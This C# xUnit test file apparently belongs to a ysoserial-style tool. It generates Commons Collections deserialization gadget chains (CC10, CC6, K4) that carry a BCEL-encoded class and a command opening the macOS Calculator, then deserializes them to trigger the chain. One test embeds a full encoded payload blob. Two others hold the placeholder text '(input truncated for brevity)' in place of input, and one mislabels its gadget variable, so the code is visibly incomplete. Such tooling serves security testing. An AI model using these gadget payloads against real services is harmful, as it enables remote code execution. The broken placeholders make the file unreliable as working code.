using Xunit;

namespace WoodpeckerYsoserial.Tests.Payloads.Custom
{
    public class BcelWithArgsTest
    {
        [Fact]
        public void GetCmdForBcelWithArg01()
        {
            var cc10 = new CommonsCollections10();
            var exp = cc10.GetObject("bcel_with_args:$$BCEL$$$l$8b$I$A$A$A$A$A$A$Au$91$dfN$db0$U$c6$3f$f7_$d2$d0A$v$94$c1$Y$a5l7a$TX$bb$ee$d4iT$m$nu$U$z$TS$b5$x7$b3$3a$a3$d4$89$S$X$c1cq$c3$Q$d2$f6$A$7b$u$b4$e3$K$95$b2$81$z$d9$fa$3e$9f$f3$3b$3e$f6$9f$db$9b$df$A$de$e1$b5$872$96$3c$y$a3$ee$60$c5$c5s$X$ab$$$d6$ac$f1$c2$c1$ba$83$97$M$a5$f7J$x$d3f$c8$fb$db$t$M$85N$fc$5d2$yt$95$96G$e3$d1$40$a6_$c4$m$o$c7$db$3f$PebT$ac3$H$h$Mu$bf$7b$w$ce$E$8f$84$k$f2$c0$a4J$P$5b$W$e0$F$f18$N$e5$81$b2I$e5$8e$88$c2$5d$hW$81$879$H$8d$K6$d1d$a8$fe$9b$cb$e0$f0$81$d2$3c$fb$c1$90$db$J$Z$f6$e2D$ea$s$P$$2$pG$fcc$92D$w$U$93$f2$dcB$c7$910q$ba$x$92$84wbm$a46$Z$ff$q$c2$5e0sZ$c1$W$5e$d9$96$c8yP$b278$95$a1aX$9aX$w$e6$87$bdiw$M$8b$f7$81$9f$c7$da$a8$91$ed$7e$u$cdT$d4$fd$ed$ee$7f1$z$w$q$cf$r$V$f2$fdo$8f$3c$cd$8cu$9c$c6$a1$cc$b2$W$5d$cf$a5$P$b2$p$Hf$l$88$f6$K$a9$P$u$92$G6$df$fc$E$bbF$ae$f4$L$f9$7e$beV$I$fa$85Z1$e8$Xk$a5$e0$K$ce$d7K$KaxF$eb$3c$f2$b4$Wh$W$d1$40$89$b4U$f4$8d$Tl$f5$O$db$a6$d3$i$ed$8d$t$b0o$l$a5$baD$wc$838$b3$d4$c5$c9$a5k$7f$B$96Y$b4$96k$C$A$A|open /System/Applications/Calculator.app/Contents/MacOS/Calculator");
            Deserializer.Deserialize(Serializer.Serialize(exp));
        }

        [Fact]
        public void GetCmdForBcelWithArg02()
        {
            var cc6 = new CommonsCollections6();
            var exp = cc6.GetObject("bcel_with_args:$$BCEL... (input truncated for brevity)");
            Deserializer.Deserialize(Serializer.Serialize(exp));
        }

        [Fact]
        public void GetCmdForBcelWithArg03()
        {
            var k4 = new CommonsCollectionsK4();
            var exp = k4.GetObject("bcel_with_args:$$BCEL... (input truncated for brevity)");
            Deserializer.Deserialize(Serializer.Serialize(exp));
        }

        [Fact]
        public void GetCmdForBcelClassFileWithArg01()
        {
            var cc10 = new CommonsCollections10();
            var exp = cc10.GetObject("bcel_class_file_with_args:/path/to/Calc.class|open /System/Applications/Calculator.app/Contents/MacOS/Calculator");
            Deserializer.Deserialize(Serializer.Serialize(exp));
        }

        [Fact]
        public void GetCmdForBcelClassFileWithArg02()
        {
            var cc6 = new CommonsCollections10();
            var exp = cc6.GetObject("bcel_class_file_with_args:/path/to/Calc.class|open /System/Applications/Calculator.app/Contents/MacOS/Calculator");
            Deserializer.Deserialize(Serializer.Serialize(exp));
        }

        [Fact]
        public void GetCmdForBcelClassFileWithArg03()
        {
            var k4 = new CommonsCollectionsK4();
            var exp = k4.GetObject("bcel_class_file_with_args:/path/to/Calc.class|open /System/Applications/Calculator.app/Contents/MacOS/Calculator");
            Deserializer.Deserialize(Serializer.Serialize(exp));
        }
    }
}